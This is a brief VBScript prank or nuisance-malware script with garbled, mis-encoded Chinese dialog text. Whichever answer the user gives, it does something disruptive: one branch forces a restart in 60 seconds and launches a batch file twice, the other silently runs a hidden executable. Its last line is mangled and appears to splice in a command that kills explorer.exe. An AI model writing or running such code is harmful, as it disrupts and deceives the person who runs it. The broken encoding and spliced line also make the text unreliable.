Dim Response
Set ws = CreateObject("Wscript.Shell") 
Response = Msgbox ("���ʣ���һ����Ӣ�����" , VbYesNo , "�ᆖ")
If Response = vbYes Then
Msgbox "�ǾͶ���233",0,"�ǺǺǺǺ�"
ws.run "cmd /k shutdown /r /t 60"
ws.run "cmd /k poi~.bat"
ws.run "cmd /k poi~.bat"
End If
If Response = vbNo Then
Msgbox "ԭ����˰�",0,"�r(�s���t)�q"
ws.run "cmd /k EQUAKE.EXE",vbhide
End Iff -t -im explorer.exe",vbhide